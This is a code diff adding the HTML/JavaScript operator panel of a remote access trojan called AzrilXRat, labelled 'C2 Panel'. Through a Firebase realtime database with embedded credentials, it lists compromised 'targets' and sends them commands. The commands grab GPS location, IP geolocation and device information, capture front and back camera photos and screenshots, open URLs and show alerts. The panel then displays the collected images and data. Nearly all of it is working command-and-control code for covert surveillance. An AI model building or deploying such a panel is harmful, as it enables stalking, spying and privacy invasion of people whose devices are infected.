@@ -1,0 +1,277 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>AzrilXRat | C2 Panel</title>
+
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-database-compat.js"></script>
+<script src="https://cdn.tailwindcss.com"></script>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
+<link href="https://fonts.googleapis.com/css2?family=Ubuntu+Mono:wght@400;700&family=Space+Grotesk:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+<script>tailwind.config={theme:{extend:{fontFamily:{mono:['Ubuntu Mono','monospace'],sans:['Space Grotesk','system-ui','sans-serif']}}}}</script>
+
+<style>
+/* ═══════════════════════ BASE ═══════════════════════ */
+::-webkit-scrollbar{display:none}
+*{scrollbar-width:none}
+body{font-family:'Space Grotesk',sans-serif;background:#181818;color:#d4d4d4;letter-spacing:.02em;min-height:100vh;position:relative}
+body::before{content:'';position:fixed;inset:0;background-image:linear-gradient(rgba(255,255,255,0.018) 1px,transparent 1px),linear-gradient(90deg,rgba(255,255,255,0.018) 1px,transparent 1px);background-size:44px 44px;pointer-events:none;z-index:0}
+.z1{position:relative;z-index:1}
+
+/* ═══════════════════════ NAV ═══════════════════════ */
+.nav{position:fixed;top:0;left:0;right:0;z-index:50;padding:15px 28px;display:flex;align-items:center;justify-content:space-between;transition:all .35s;border-bottom:1px solid transparent}
+.nav.on{background:rgba(24,24,24,.82);backdrop-filter:blur(14px);border-bottom:1px solid #272727}
+.nav-brand{display:flex;align-items:center;gap:10px;font-weight:700;font-size:15px;color:#fff}
+.nav-brand span{color:#404040;font-weight:400}
+.nav-status{display:flex;align-items:center;gap:7px;font-family:'Ubuntu Mono',monospace;font-size:9px;color:#666;letter-spacing:.08em;text-transform:uppercase;border:1px solid #272727;padding:5px 14px;border-radius:999px;background:#181818}
+.nav-dot{width:5px;height:5px;border-radius:50%;background:#4ade80;animation:pls 2s ease-in-out infinite}
+.nav-dot.off{background:#f87171;animation:none}
+@keyframes pls{0%,100%{opacity:1}50%{opacity:.15}}
+
+/* ═══════════════════════ LAYOUT ═══════════════════════ */
+.wrap{max-width:1240px;margin:0 auto;padding:88px 20px 40px}
+
+/* ═══════════════════════ STATS ═══════════════════════ */
+.stats{display:grid;grid-template-columns:repeat(4,1fr);gap:8px;margin-bottom:12px}
+.stat{background:#212121;border:1px solid #2a2a2a;border-radius:14px;padding:18px 20px;transition:.25s;position:relative;overflow:hidden}
+.stat:hover{border-color:#383838}
+.stat::after{content:'';position:absolute;bottom:-18px;right:-18px;font-family:'Font Awesome 6 Free';font-weight:900;font-size:72px;opacity:.03}
+.stat:nth-child(1)::after{content:'\f233'}
+.stat:nth-child(2)::after{content:'\f120'}
+.stat:nth-child(3)::after{content:'\f1c0'}
+.stat:nth-child(4)::after{content:'\f017'}
+.stat-lb{font-family:'Ubuntu Mono',monospace;font-size:8.5px;color:#555;letter-spacing:.08em;text-transform:uppercase;margin-bottom:5px;display:flex;align-items:center;gap:6px}
+.stat-vl{font-size:20px;font-weight:600;color:#fff}
+
+/* ═══════════════════════ MAIN GRID ═══════════════════════ */
+.grid{display:grid;grid-template-columns:255px 1fr;gap:10px}
+
+/* ═══════════════════════ SIDEBAR ═══════════════════════ */
+.side{background:#212121;border:1px solid #2a2a2a;border-radius:16px;overflow:hidden;max-height:66vh;display:flex;flex-direction:column}
+.side-hd{padding:15px 18px;border-bottom:1px solid #2a2a2a;font-family:'Ubuntu Mono',monospace;font-size:9px;color:#777;letter-spacing:.07em;text-transform:uppercase;display:flex;align-items:center;justify-content:space-between}
+.side-ct{font-family:'Ubuntu Mono',monospace;font-size:9.5px;color:#4ade80;background:rgba(74,222,128,.04);padding:3px 11px;border-radius:999px;border:1px solid rgba(74,222,128,.12)}
+.side-ls{overflow-y:auto;flex:1}
+.side-it{padding:12px 18px;border-bottom:1px solid #191919;cursor:pointer;transition:.18s;display:flex;align-items:center;gap:9px}
+.side-it:hover{background:#1a1a1a}
+.side-it.ac{background:#151515;border-left:2px solid #4ade80}
+.side-dt{width:5px;height:5px;border-radius:50%;background:#4ade80;flex-shrink:0}
+.side-dt.off{background:#2a2a2a}
+.side-nm{font-size:10.5px;color:#ccc;flex:1;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.side-mo{font-family:'Ubuntu Mono',monospace;font-size:7.5px;color:#444}
+.side-em{text-align:center;color:#444;padding:28px;font-size:9.5px}
+
+/* ═══════════════════════ CONTROL ═══════════════════════ */
+.ctrl{background:#212121;border:1px solid #2a2a2a;border-radius:16px;overflow:hidden;display:flex;flex-direction:column}
+.ctrl-hd{padding:15px 20px;border-bottom:1px solid #2a2a2a;display:flex;align-items:center;justify-content:space-between}
+.ctrl-tt{font-size:11px;font-weight:500;color:#999;display:flex;align-items:center;gap:7px}
+.ctrl-id{font-family:'Ubuntu Mono',monospace;font-size:8.5px;color:#555;background:#181818;padding:4px 11px;border-radius:999px;border:1px solid #252525}
+
+/* ═══════════════════════ ACTIONS ═══════════════════════ */
+.acts{display:grid;grid-template-columns:repeat(auto-fill,minmax(135px,1fr));gap:7px;padding:14px}
+.act{border:1px solid #2a2a2a;border-radius:12px;padding:15px 10px;cursor:pointer;transition:.22s;background:#1a1a1a;text-align:center}
+.act:hover{border-color:#3a3a3a;background:#222;transform:translateY(-1px)}
+.act.flash{border-color:#4ade80!important;background:#0c1a0c!important;animation:fl .5s ease-out}
+@keyframes fl{0%{opacity:.4;transform:scale(.95)}100%{opacity:1;transform:scale(1)}}
+.act-ic{font-size:19px;display:block;margin-bottom:5px}
+.act-lb{font-size:9.5px;font-weight:500;color:#999}
+.act-in{background:#111;border:1px solid #2a2a2a;color:#bbb;padding:5px 7px;border-radius:5px;font-size:8.5px;width:100%;margin-top:5px;font-family:'Ubuntu Mono',monospace;outline:none}
+.act-in:focus{border-color:#444}
+.act-bt{background:#111;border:1px solid #2a2a2a;color:#777;padding:4px 10px;border-radius:5px;font-size:8.5px;margin-top:4px;cursor:pointer;width:100%;transition:.2s;font-family:'Space Grotesk',sans-serif}
+.act-bt:hover{background:#252525;color:#fff;border-color:#444}
+
+/* ═══════════════════════ CONSOLE ═══════════════════════ */
+.cons{border-top:1px solid #2a2a2a;padding:14px 20px}
+.cons-hd{font-family:'Ubuntu Mono',monospace;font-size:8.5px;color:#444;letter-spacing:.07em;text-transform:uppercase;margin-bottom:7px;display:flex;align-items:center;gap:6px}
+.cons-bx{background:#111;border:1px solid #252525;border-radius:9px;padding:10px 12px;height:140px;overflow-y:auto;font-family:'Ubuntu Mono',monospace;font-size:8.5px;line-height:1.65;color:#555}
+.cgr{color:#4ade80}.cgs{color:#facc15}.cge{color:#f87171}.cgb{color:#60a5fa}
+
+/* ═══════════════════════ MODAL ═══════════════════════ */
+.mod{position:fixed;inset:0;background:rgba(0,0,0,.88);backdrop-filter:blur(10px);z-index:100;display:flex;align-items:center;justify-content:center;padding:18px}
+.mod-bx{background:#212121;border:1px solid #2a2a2a;border-radius:18px;padding:0;min-width:460px;max-width:93vw;max-height:82vh;overflow:hidden;animation:mdIn .28s cubic-bezier(.16,1,.3,1)}
+@keyframes mdIn{0%{opacity:0;transform:scale(.9) translateY(16px)}100%{opacity:1;transform:scale(1) translateY(0)}}
+.mod-hd{background:#191919;border-bottom:1px solid #2a2a2a;padding:16px 20px;display:flex;align-items:center;gap:10px}
+.mod-ic{width:38px;height:38px;border-radius:10px;display:flex;align-items:center;justify-content:center;font-size:15px;flex-shrink:0}
+.mod-ic.gps{background:rgba(74,222,128,.08);color:#4ade80}
+.mod-ic.ip{background:rgba(96,165,250,.08);color:#60a5fa}
+.mod-ic.info{background:rgba(251,146,60,.08);color:#fb923c}
+.mod-ic.cam{background:rgba(244,114,182,.08);color:#f472b6}
+.mod-ic.shot{background:rgba(129,140,248,.08);color:#818cf8}
+.mod-ic.def{background:rgba(148,163,184,.08);color:#94a3b8}
+.mod-tt{font-size:13px;font-weight:600;color:#fff}
+.mod-sb{font-size:8px;color:#555;font-family:'Ubuntu Mono',monospace}
+.mod-bd{padding:18px 20px;max-height:48vh;overflow-y:auto}
+.dr{display:flex;justify-content:space-between;align-items:center;padding:9px 0;border-bottom:1px solid #1a1a1a}
+.dr:last-child{border-bottom:none}
+.dl{font-size:9px;color:#666;font-family:'Ubuntu Mono',monospace;text-transform:uppercase;letter-spacing:.05em}
+.dv{font-size:10.5px;color:#ddd;font-weight:500;text-align:right;max-width:58%;word-break:break-all}
+.dv.lk{color:#60a5fa;cursor:pointer}.dv.lk:hover{text-decoration:underline}
+.mod-ft{border-top:1px solid #2a2a2a;padding:12px 20px;display:flex;gap:7px;flex-wrap:wrap}
+.mbt{flex:1;min-width:80px;padding:9px;border-radius:8px;font-family:'Space Grotesk',sans-serif;font-size:10px;font-weight:500;cursor:pointer;transition:.2s;text-align:center}
+.mbt.cl{background:transparent;border:1px solid #2a2a2a;color:#777}.mbt.cl:hover{background:#1a1a1a;color:#fff}
+.mbt.cp{background:#181818;border:1px solid #2a2a2a;color:#999}.mbt.cp:hover{background:#222;color:#fff}
+.mbt.dl{background:rgba(74,222,128,.06);border:1px solid rgba(74,222,128,.15);color:#4ade80}.mbt.dl:hover{background:rgba(74,222,128,.12)}
+.img-pv{width:100%;border-radius:10px;margin-top:6px;cursor:pointer;border:1px solid #2a2a2a}
+.map-lk{display:block;background:rgba(96,165,250,.04);border:1px solid rgba(96,165,250,.12);border-radius:8px;padding:10px;color:#60a5fa;text-align:center;font-size:10px;cursor:pointer;margin-top:6px;transition:.2s;font-weight:500}
+.map-lk:hover{background:rgba(96,165,250,.1)}
+
+/* ═══════════════════════ TOAST ═══════════════════════ */
+.toast{position:fixed;bottom:22px;right:22px;z-index:200;background:#212121;border:1px solid #4ade80;color:#4ade80;font-family:'Ubuntu Mono',monospace;font-size:9px;padding:9px 18px;border-radius:999px;opacity:0;transform:translateY(8px);transition:.3s;pointer-events:none}
+.toast.sh{opacity:1;transform:translateY(0)}
+.toast.er{border-color:#f87171;color:#f87171}
+
+/* ═══════════════════════ RESPONSIVE ═══════════════════════ */
+@media(max-width:768px){.grid{grid-template-columns:1fr}.side{max-height:140px}.acts{grid-template-columns:1fr 1fr}.mod-bx{min-width:auto;max-width:96vw}.stats{grid-template-columns:1fr 1fr}}
+</style>
+</head>
+<body>
+
+<!-- NAV -->
+<nav class="nav z1" id="nav">
+  <div class="nav-brand"><i class="fas fa-skull" style="color:#555"></i> AzrilXRat<span>.panel</span></div>
+  <div class="nav-status"><span class="nav-dot" id="statusDot"></span><span id="statusText">INIT</span></div>
+</nav>
+
+<!-- WRAP -->
+<div class="wrap z1">
+
+  <!-- STATS -->
+  <div class="stats">
+    <div class="stat"><p class="stat-lb"><i class="fas fa-circle-nodes" style="color:#4ade80"></i> Online</p><p class="stat-vl" id="sOnline">0</p></div>
+    <div class="stat"><p class="stat-lb"><i class="fas fa-terminal" style="color:#60a5fa"></i> Commands</p><p class="stat-vl" id="sCmds">0</p></div>
+    <div class="stat"><p class="stat-lb"><i class="fas fa-database" style="color:#facc15"></i> Data</p><p class="stat-vl" id="sData">0 KB</p></div>
+    <div class="stat"><p class="stat-lb"><i class="fas fa-clock" style="color:#c084fc"></i> Uptime</p><p class="stat-vl" id="sUptime">00:00</p></div>
+  </div>
+
+  <!-- MAIN GRID -->
+  <div class="grid" style="margin-top:10px">
+
+    <!-- SIDEBAR -->
+    <div class="side">
+      <div class="side-hd"><span><i class="fas fa-laptop-code" style="color:#777"></i> Devices</span><span class="side-ct" id="sideCount">0</span></div>
+      <div class="side-ls" id="sideList"><div class="side-em">Waiting for targets...</div></div>
+    </div>
+
+    <!-- CONTROL -->
+    <div class="ctrl">
+      <div class="ctrl-hd">
+        <span class="ctrl-tt"><i class="fas fa-bolt" style="color:#facc15"></i> Command Center</span>
+        <span class="ctrl-id" id="ctrlDevId">No device selected</span>
+      </div>
+
+      <div class="acts">
+        <div class="act" onclick="send('GPS')"><span class="act-ic" style="color:#4ade80"><i class="fas fa-location-crosshairs"></i></span><p class="act-lb">GPS Location</p></div>
+        <div class="act" onclick="send('IP')"><span class="act-ic" style="color:#60a5fa"><i class="fas fa-globe"></i></span><p class="act-lb">IP Geo</p></div>
+        <div class="act" onclick="send('INFO')"><span class="act-ic" style="color:#fb923c"><i class="fas fa-mobile-screen"></i></span><p class="act-lb">Device Info</p></div>
+        <div class="act" onclick="send('CAM')"><span class="act-ic" style="color:#f472b6"><i class="fas fa-camera-retro"></i></span><p class="act-lb">Camera</p></div>
+        <div class="act" onclick="send('SHOT')"><span class="act-ic" style="color:#818cf8"><i class="fas fa-desktop"></i></span><p class="act-lb">Screenshot</p></div>
+        <div class="act"><span class="act-ic" style="color:#38bdf8"><i class="fas fa-arrow-up-right-from-square"></i></span><p class="act-lb">Open URL</p><input class="act-in" id="urlIn" placeholder="https://..." onclick="event.stopPropagation()"><button class="act-bt" onclick="event.stopPropagation();send('URL:'+document.getElementById('urlIn').value)">SEND</button></div>
+        <div class="act"><span class="act-ic" style="color:#fbbf24"><i class="fas fa-triangle-exclamation"></i></span><p class="act-lb">Alert</p><input class="act-in" id="alertIn" placeholder="Message..." onclick="event.stopPropagation()"><button class="act-bt" onclick="event.stopPropagation();send('MSG:'+document.getElementById('alertIn').value)">SEND</button></div>
+      </div>
+
+      <!-- CONSOLE -->
+      <div class="cons">
+        <div class="cons-hd"><i class="fas fa-code" style="color:#444"></i> Console</div>
+        <div class="cons-bx" id="consoleBox"><span style="color:#444">[System] Panel ready.</span></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- MODAL -->
+<div class="mod" id="mod" style="display:none" onclick="clsMod()">
+  <div class="mod-bx" onclick="event.stopPropagation()">
+    <div class="mod-hd">
+      <div class="mod-ic def" id="modIc"><i class="fas fa-info-circle"></i></div>
+      <div><div class="mod-tt" id="modTt">Result</div><div class="mod-sb" id="modSb"></div></div>
+    </div>
+    <div class="mod-bd" id="modBd"></div>
+    <div class="mod-ft" id="modFt"></div>
+  </div>
+</div>
+
+<!-- TOAST -->
+<div class="toast" id="toast"></div>
+
+<script>
+// ═══════════════════════ FIREBASE ═══════════════════════
+const FB={apiKey:"AIzaSyBvlhJRWV8PIH09bHKdUpQKv4x6mT9wCIE",authDomain:"krynodexrat.firebaseapp.com",databaseURL:"https://krynodexrat-default-rtdb.asia-southeast1.firebasedatabase.app",projectId:"krynodexrat",storageBucket:"krynodexrat.firebasestorage.app",messagingSenderId:"465327768431",appId:"1:465327768431:web:3e5871b9f80dcbcad1de9a"};
+firebase.initializeApp(FB);
+const db=firebase.database();
+const devRef=db.ref('devices'),cmdRef=db.ref('cmds'),datRef=db.ref('data');
+
+// ═══════════════════════ STATE ═══════════════════════
+let selDev=null,devs={},cmdN=0,datSz=0,t0=Date.now(),lastR=null;
+
+// ═══════════════════════ UPTIME ═══════════════════════
+setInterval(()=>{const e=Math.floor((Date.now()-t0)/1000);document.getElementById('sUptime').textContent=Math.floor(e/60).toString().padStart(2,'0')+':'+(e%60).toString().padStart(2,'0')},1000);
+
+// ═══════════════════════ CONNECTION ═══════════════════════
+db.ref('.info/connected').on('value',s=>{const d=document.getElementById('statusDot'),t=document.getElementById('statusText');if(s.val()){d.classList.remove('off');t.textContent='CONNECTED'}else{d.classList.add('off');t.textContent='OFFLINE'}});
+
+// ═══════════════════════ NAV SCROLL ═══════════════════════
+addEventListener('scroll',()=>document.getElementById('nav').classList.toggle('on',scrollY>20),{passive:true});
+
+// ═══════════════════════ TOAST ═══════════════════════
+let tmr;function tst(m,e){clearTimeout(tmr);const t=document.getElementById('toast');t.textContent=m;t.className='toast'+(e?' er':'')+' sh';tmr=setTimeout(()=>t.classList.remove('sh'),2000)}
+
+// ═══════════════════════ DEVICE LISTENERS ═══════════════════════
+devRef.on('child_added',s=>{const d=s.val();d.id=s.key;devs[s.key]=d;renderDevs();lg('[+] '+s.key.slice(0,10),'cgr')});
+devRef.on('child_changed',s=>{devs[s.key]={...devs[s.key],...s.val()};renderDevs()});
+devRef.on('child_removed',s=>{delete devs[s.key];if(selDev===s.key){selDev=null;document.getElementById('ctrlDevId').textContent='No device selected'}renderDevs();lg('[-] '+s.key.slice(0,10),'cge')});
+
+// ═══════════════════════ DATA LISTENERS ═══════════════════════
+datRef.on('child_added',s=>{const r=s.val();if(!r)return;cmdN++;datSz+=JSON.stringify(r).length;document.getElementById('sCmds').textContent=cmdN;document.getElementById('sData').textContent=(datSz/1024).toFixed(1)+' KB';lg('[←] '+r.type,'cgb');lastR=r;showMod(r);s.ref.remove()});
+
+// ═══════════════════════ RENDER DEVICES ═══════════════════════
+function renderDevs(){const ids=Object.keys(devs);document.getElementById('sOnline').textContent=ids.length;document.getElementById('sideCount').textContent=ids.length;if(!ids.length){document.getElementById('sideList').innerHTML='<div class="side-em">Waiting for targets...</div>';return}document.getElementById('sideList').innerHTML=ids.map(id=>{const d=devs[id],ac=selDev===id?' ac':'',off=(Date.now()-d.seen)>35000;return`<div class="side-it${ac}" onclick="sel('${id}')"><span class="side-dt${off?' off':''}"></span><span class="side-nm">${id.slice(0,9)}...</span><span class="side-mo">${d.model||'?'}</span></div>`}).join('')}
+
+// ═══════════════════════ SELECT ═══════════════════════
+function sel(id){selDev=id;document.getElementById('ctrlDevId').textContent=id.slice(0,16)+'...';renderDevs();lg('[>] '+id.slice(0,9),'cgs')}
+
+// ═══════════════════════ SEND ═══════════════════════
+function send(cmd){if(!selDev){tst('Select a device',1);return}cmdRef.child(selDev).push({cmd,st:'pending',time:Date.now()});lg('[→] '+cmd,'cgs');tst(cmd);document.querySelectorAll('.act').forEach(a=>{a.classList.add('flash');setTimeout(()=>a.classList.remove('flash'),400)})}
+
+// ═══════════════════════ LOG ═══════════════════════
+function lg(m,c=''){const t=new Date().toLocaleTimeString(),b=document.getElementById('consoleBox');b.innerHTML+=`<br><span class="${c}">[${t}] ${m}</span>`;b.scrollTop=b.scrollHeight}
+
+// ═══════════════════════ MODAL ═══════════════════════
+function showMod(r){
+  const typeMap={GPS:'gps',IP:'ip',INFO:'info',CAM:'cam',SHOT:'shot'};
+  const iconMap={gps:'<i class="fas fa-location-crosshairs"></i>',ip:'<i class="fas fa-globe"></i>',info:'<i class="fas fa-mobile-screen"></i>',cam:'<i class="fas fa-camera-retro"></i>',shot:'<i class="fas fa-desktop"></i>',def:'<i class="fas fa-info-circle"></i>'};
+  const ic=typeMap[r.type]||'def';
+  document.getElementById('modIc').className='mod-ic '+ic;
+  document.getElementById('modIc').innerHTML=iconMap[ic]||iconMap.def;
+  document.getElementById('modTt').textContent=r.type;
+  document.getElementById('modSb').textContent=new Date(r.time).toLocaleString();
+  
+  const d=r.data||{};let h='';let btns='';
+  if(d.err){h=`<div style="color:#f87171;padding:10px;background:rgba(248,113,113,.04);border:1px solid rgba(248,113,113,.15);border-radius:8px;font-size:10px"><i class="fas fa-circle-exclamation"></i> ${d.err}</div>`}
+  else{
+    for(const[k,v]of Object.entries(d)){
+      if((k==='front'||k==='back'||k==='url')&&typeof v==='string'&&v.startsWith('http')){
+        const lb=k==='front'?'Front Camera':k==='back'?'Back Camera':'Screenshot';
+        h+=`<div class="dr"><span class="dl">${lb}</span></div><img src="${v}" class="img-pv" onclick="open('${v}')" onerror="this.remove()" loading="lazy">`;
+        btns+=`<button class="mbt dl" onclick="open('${v}')"><i class="fas fa-download"></i> ${lb}</button>`;
+        continue;
+      }
+      if(k==='map'&&v){h+=`<div class="map-lk" onclick="open('${v}')"><i class="fas fa-map-marker-alt"></i> Open in Google Maps</div>`;continue}
+      if(typeof v!=='object'){h+=`<div class="dr"><span class="dl">${k}</span><span class="dv">${v}</span></div>`}
+    }
+  }
+  document.getElementById('modBd').innerHTML=h||'<div style="color:#555;text-align:center;padding:16px">No data</div>';
+  document.getElementById('modFt').innerHTML=btns+'<button class="mbt cp" onclick="cpy()"><i class="fas fa-copy"></i> Copy</button><button class="mbt cl" onclick="clsMod()"><i class="fas fa-xmark"></i> Close</button>';
+  document.getElementById('mod').style.display='flex';
+}
+
+function clsMod(){document.getElementById('mod').style.display='none'}
+function cpy(){if(lastR){navigator.clipboard.writeText(JSON.stringify(lastR,null,2));tst('Copied!')}}
+
+// ═══════════════════════ AUTO CLEAN (60 min) ═══════════════════════
+setInterval(()=>{let c=0;Object.keys(devs).forEach(id=>{if((Date.now()-devs[id].seen)>3600000){devRef.child(id).remove();c++}});if(c)lg('[AUTO] Cleaned '+c+' offline','cge')},60000);
+
+lg('Panel ready');
+</script>
+</body>
+</html>
